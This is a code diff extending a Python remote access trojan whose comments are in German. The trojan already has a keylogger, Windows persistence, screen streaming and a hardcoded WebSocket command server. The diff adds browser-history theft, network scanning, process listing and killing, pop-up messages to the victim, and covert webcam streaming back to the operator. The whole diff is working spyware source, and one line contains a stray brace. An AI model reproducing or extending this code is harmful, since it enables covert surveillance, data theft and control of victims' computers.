@@ -17,6 +17,10 @@ import logging
 import secrets
 import time
 from datetime import datetime
+import browserhistory as bh
+import psutil
+import pygetwindow as gw
+import pyautogui
 
 # --- Konfiguration & Globals ---
 SERVER_URI = os.getenv("SERVER_URI", "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app/rat")
@@ -80,6 +84,136 @@ def get_detailed_system_info() -> str:
         return "\n".join(f"{k.replace('_', ' ').title()}: {v}" for k, v in info.items())
     except Exception as e:
         return f"Fehler beim Abrufen der Systeminformationen: {e}"
+
+def get_network_info() -> str:
+    """Sammelt detaillierte Netzwerkinformationen."""
+    try:
+        info = {"Öffentliche IP": get_public_ip()}
+        
+        # Hostname und lokale IPs
+        hostname = socket.gethostname()
+        info["Hostname"] = hostname
+        try:
+            info["Lokale IPs"] = ", ".join(socket.gethostbyname_ex(hostname)[2])
+        except socket.gaierror:
+            info["Lokale IPs"] = "Nicht gefunden"
+
+        # Netzwerk-Interfaces und Verbindungen
+        if_addrs = psutil.net_if_addrs()
+        interfaces = []
+        for interface_name, interface_addresses in if_addrs.items():
+            for address in interface_addresses:
+                if str(address.family) == 'AddressFamily.AF_INET':
+                    interfaces.append(f"  - {interface_name}: IP {address.address}, Maske {address.netmask}")
+        info["Netzwerk-Interfaces"] = "\n" + "\n".join(interfaces) if interfaces else "Keine gefunden"
+
+        connections = psutil.net_connections(kind='inet')
+        info["Aktive TCP-Verbindungen"] = len(connections)
+
+        return "\n".join(f"{k}: {v}" for k, v in info.items())
+    except Exception as e:
+        return f"Fehler beim Abrufen der Netzwerkinformationen: {e}"
+
+def get_history() -> str:
+    """Ruft den Browserverlauf ab."""
+    try:
+        history = bh.get_browserhistory()
+        output = ["Browserverlauf:"]
+        # Nehmen wir die letzten 20 Einträge von jedem Browser
+        for browser, entries in history.items():
+            output.append(f"\n--- {browser.title()} ---")
+            if entries:
+                for url, title, timestamp in entries[-20:]:
+                    output.append(f"[{timestamp}] {title}\n  {url}")
+            else:
+                output.append("Kein Verlauf gefunden.")
+        return "\n".join(output)
+    except Exception as e:
+        return f"Fehler beim Abrufen des Verlaufs: {e}"
+
+async def scan_network(cidr_range: str) -> str:
+    """Scant das Netzwerk nach aktiven Hosts."""
+    try:
+        import ipaddress
+        net = ipaddress.ip_network(cidr_range, strict=False)
+        tasks = []
+        active_hosts = []
+
+        # Ping-Befehl je nach Betriebssystem anpassen
+        ping_cmd = "ping -n 1 -w 500" if platform.system() == "Windows" else "ping -c 1 -W 0.5"
+
+        async def ping_host(ip):
+            proc = await asyncio.create_subprocess_shell(
+                f"{ping_cmd} {ip}",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, _ = await proc.communicate()
+            if proc.returncode == 0:
+                active_hosts.append(str(ip))
+
+        for ip in net.hosts():
+            tasks.append(ping_host(str(ip)))
+        
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+        if not active_hosts:
+            return f"Keine aktiven Hosts im Bereich {cidr_range} gefunden."
+        
+        return f"Aktive Hosts in {cidr_range}:\n" + "\n".join(sorted(active_hosts))
+
+    except ImportError:
+        return "Fehler: 'ipaddress'-Modul nicht gefunden."
+    except ValueError:
+        return f"Fehler: Ungültiger CIDR-Bereich '{cidr_range}'."
+    except Exception as e:
+        return f"Fehler beim Netzwerk-Scan: {e}"
+
+def get_process_list() -> str:
+    """Listet laufende Prozesse auf."""
+    try:
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
+            try:
+                pinfo = proc.as_dict(attrs=['pid', 'name', 'username', 'cpu_percent', 'memory_info'])
+                pinfo['memory_mb'] = round(pinfo['memory_info'].rss / (1024 * 1024), 2)
+                processes.append(pinfo)
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        
+        # Sortieren nach CPU-Auslastung
+        processes.sort(key=lambda p: p['cpu_percent'], reverse=True)
+        
+        output = ["PID\tCPU(%)\tMEM(MB)\tUsername\tName"]
+        for p in processes[:50]: # Die Top 50 anzeigen
+            output.append(f"{p['pid']}\t{p['cpu_percent']:.2f}\t{p['memory_mb']:.2f}\t{p.get('username', 'N/A')}\t{p['name']}")
+        return "\n".join(output)
+    except Exception as e:
+        return f"Fehler beim Auflisten der Prozesse: {e}"}
+
+def kill_process(pid: str) -> str:
+    """Beendet einen Prozess anhand seiner PID."""
+    try:
+        pid = int(pid)
+        process = psutil.Process(pid)
+        process.terminate()
+        return f"Prozess {pid} ({process.name()}) wurde beendet."
+    except ValueError:
+        return "Fehler: Ungültige PID."
+    except psutil.NoSuchProcess:
+        return f"Fehler: Prozess mit PID {pid} nicht gefunden."
+    except psutil.AccessDenied:
+        return f"Fehler: Zugriff verweigert, um Prozess {pid} zu beenden."
+    except Exception as e:
+        return f"Fehler beim Beenden des Prozesses: {e}"
+
+def show_message_box(text: str) -> str:
+    """Zeigt eine Nachrichtenbox auf dem Client an."""
+    try:
+        pyautogui.alert(text=text, title="Nachricht vom Server")
+        return "Nachrichtenbox angezeigt."
+    except Exception as e:
+        return f"Fehler beim Anzeigen der Nachrichtenbox: {e}"
 
 def ensure_persistence():
     """Stellt Persistenz unter Windows sicher."""
@@ -203,6 +337,76 @@ class ScreenStreamer:
 
 screen_streamer = ScreenStreamer()
 
+# === Webcam Streaming ===
+class WebcamStreamer:
+    def __init__(self):
+        self._task = None
+        self._running = False
+        self._ws = None
+        self._cap = None
+
+    async def start(self, ws):
+        if self._running: return
+        
+        try:
+            # Dynamischer Import von OpenCV
+            global cv2
+            import cv2
+        except ImportError:
+            logging.error("OpenCV ist nicht installiert. Webcam-Funktion ist deaktiviert.")
+            await ws.send(json.dumps({"type": "command_output", "output": "Fehler: OpenCV nicht auf dem Client installiert."}))
+            return
+
+        self._running = True
+        self._ws = ws
+        self._task = asyncio.create_task(self._stream())
+        logging.info("Webcam-Streaming gestartet.")
+
+    async def stop(self):
+        self._running = False
+        if self._task:
+            self._task.cancel()
+            self._task = None
+        if self._cap:
+            self._cap.release()
+            self._cap = None
+        logging.info("Webcam-Streaming gestoppt.")
+
+    async def _stream(self):
+        self._cap = cv2.VideoCapture(0)
+        if not self._cap.isOpened():
+            logging.error("Konnte Webcam nicht öffnen.")
+            await self._ws.send(json.dumps({"type": "command_output", "output": "Fehler: Webcam konnte nicht geöffnet werden."}))
+            self._running = False
+            return
+
+        while self._running:
+            try:
+                ret, frame = self._cap.read()
+                if not ret: break
+
+                # Bild für die Übertragung optimieren
+                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                img = Image.fromarray(frame_rgb)
+                img.thumbnail((640, 480), Image.LANCZOS)
+                
+                buf = io.BytesIO()
+                img.save(buf, format='JPEG', quality=70)
+                img_base64 = base64.b64encode(buf.getvalue()).decode('utf-8')
+                
+                await self._ws.send(json.dumps({"type": "webcam_frame", "data": img_base64}))
+                await asyncio.sleep(0.05) # ~20 FPS
+            except (websockets.ConnectionClosed, asyncio.CancelledError):
+                break
+            except Exception as e:
+                logging.error(f"Fehler im Webcam-Stream: {e}")
+                break
+        
+        if self._cap: self._cap.release()
+        logging.info("Webcam-Stream-Schleife beendet.")
+
+webcam_streamer = WebcamStreamer()
+
 # === Hauptlogik: Befehlsverarbeitung ===
 async def process_commands(websocket: websockets.ClientConnection):
     async for message in websocket:
@@ -236,6 +440,13 @@ async def process_commands(websocket: websockets.ClientConnection):
             elif action == "ls": output = list_directory(command.get("path", "."))
             elif action == "cd": output = change_directory(command.get("path", "."))
             elif action == "systeminfo": output = get_detailed_system_info()
+            elif action == "network_info": output = get_network_info()
+            elif action == "history": output = get_history()
+            elif action == "ps": output = get_process_list()
+            elif action == "kill": output = kill_process(command.get("pid"))
+            elif action == "msgbox": output = show_message_box(command.get("text"))
+            elif action == "network_scan":
+                output = await scan_network(command.get("range", "192.168.1.0/24"))
             elif action == "keylogger":
                 if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                     output = "Keylogger nicht verfügbar oder keine Daten."
@@ -252,6 +463,12 @@ async def process_commands(websocket: websockets.ClientConnection):
             elif action == "screenstream_stop":
                 await screen_streamer.stop()
                 output = "Screen-Streaming gestoppt."
+            elif action == "webcam_start":
+                await webcam_streamer.start(websocket)
+                output = "Webcam-Streaming wird gestartet..."
+            elif action == "webcam_stop":
+                await webcam_streamer.stop()
+                output = "Webcam-Streaming gestoppt."
             else: output = f"Unbekannte Aktion: {action}"
 
             if output: response["output"] = output
